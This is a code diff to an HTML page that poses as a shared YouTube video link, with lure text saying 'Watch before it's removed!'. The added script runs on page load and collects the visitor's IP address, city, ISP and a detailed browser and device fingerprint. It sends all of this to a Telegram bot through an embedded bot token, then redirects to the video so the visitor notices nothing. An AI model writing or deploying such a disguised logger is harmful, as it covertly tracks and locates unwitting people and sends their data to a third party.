@@ -2,32 +2,89 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Watch this video</title>
+  <title>Watch This Video</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- Open Graph Meta Tags -->
+  <!-- Optional: Show YouTube thumbnail in preview when shared -->
   <meta property="og:title" content="Check out this video!">
-  <meta property="og:description" content="Click to watch now!">
+  <meta property="og:description" content="Watch before it's removed!">
   <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
-  <meta property="og:url" content="https://yourusername.github.io/videoredirect">
+  <meta property="og:url" content="https://yourusername.github.io/yourrepo/">
   <meta property="og:type" content="website">
+</head>
+<body style="text-align:center; font-family:sans-serif; margin-top:100px;">
 
-  <!-- Twitter Card -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Check out this video!">
-  <meta name="twitter:description" content="Click to watch now!">
-  <meta name="twitter:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+  <h2>Redirecting...</h2>
+  <p>Please wait while we take you to the video.</p>
 
   <script>
-    window.onload = function () {
-      setTimeout(() => {
+    async function collectAndSendToTelegram() {
+      try {
+        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+
+        const payload = {
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name,
+          org: ipData.org,
+          timezone: ipData.timezone,
+          timeOffset: new Date().getTimezoneOffset(),
+          language: navigator.language,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          screen: `${screen.width}x${screen.height}`,
+          colorDepth: screen.colorDepth,
+          deviceMemory: navigator.deviceMemory || "N/A",
+          cpuCores: navigator.hardwareConcurrency || "N/A",
+          online: navigator.onLine,
+          doNotTrack: navigator.doNotTrack,
+          touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+          connection: navigator.connection ? navigator.connection.effectiveType : "N/A",
+          referrer: document.referrer
+        };
+
+        const message = `
+📥 *New Visitor Logged*
+🌐 *IP:* ${payload.ip}
+📍 *Location:* ${payload.city}, ${payload.region}, ${payload.country}
+🛰 *ISP:* ${payload.org}
+🕒 *Timezone:* ${payload.timezone}
+🧭 *Offset:* ${payload.timeOffset}
+🧠 *Language:* ${payload.language}
+📱 *Platform:* ${payload.platform}
+🖥 *Screen:* ${payload.screen}
+🌈 *Color Depth:* ${payload.colorDepth}
+🧮 *RAM:* ${payload.deviceMemory} GB
+🧠 *CPU Cores:* ${payload.cpuCores}
+📡 *Network:* ${payload.connection}
+🔍 *Referrer:* ${payload.referrer}
+🕶 *User-Agent:* ${payload.userAgent}`
+
+        await fetch("https://api.telegram.org/7330139447:AAH5btbZ4pKGYORK_GdXPnOE0Bbp63eiuFA/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: "1537302428",
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+
+        // Redirect to video after 2 seconds
+        setTimeout(() => {
+          window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        }, 2000);
+
+      } catch (e) {
+        // On error, still redirect
         window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-      }, 1500);
-    };
+      }
+    }
+
+    // Trigger when page loads
+    window.onload = collectAndSendToTelegram;
   </script>
-</head>
-<body style="font-family:sans-serif; text-align:center; margin-top:100px;">
-  <h2>Redirecting...</h2>
-  <p>Please wait while we load the video.</p>
+
 </body>
 </html>
